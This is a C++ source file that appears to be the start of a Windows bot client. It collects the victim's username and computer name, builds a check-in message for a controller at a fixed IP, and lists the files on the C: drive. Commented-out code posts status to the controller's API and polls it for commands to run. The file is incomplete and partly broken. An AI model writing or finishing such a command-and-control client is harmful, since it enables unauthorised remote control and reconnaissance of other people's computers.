// client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <Lmcons.h>
#include <thread>
#include <vector>
#include <string>
#include "http.h"
#include "bot.h"

string utf8_encode(const wstring& wstr)
{
    if (wstr.empty()) return string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}



string list(LPCWSTR path) {
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(path, &data);
    int count = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            cout << utf8_encode(data.cFileName) << endl;
            count += 1;
        } while (FindNextFile(hFind, &data));
        FindClose(hFind);
        cout << count << endl;
        return "eml";
    }
}



int main()
{
    char username[UNLEN + 1];
    char hostname[UNLEN + 1];
    DWORD hostname_len = UNLEN + 1;
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    GetComputerNameA(hostname, &hostname_len);
    Bot bot = Bot("windows", "456822", username, hostname, "10.0.0.14");
    string end = bot.form_ping_json();
    //cout << bot.form_ping_json() << endl;
    //cout << send_post(bot.get_master(), "/api/456822/status", bot.form_ping_json()) << endl;
    //cout << bot.ping_server() << endl;
    list(L"C:\\\*");
   /* while(true){
         string cmd = bot.ping_server();
         cout << cmd << endl;
         cout << "ping" << endl;
         if (cmd == "ls") {
             cout << "We printing" << endl;
         }
         this_thread::sleep_for(chrono::seconds(10)); 
    }*/


    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
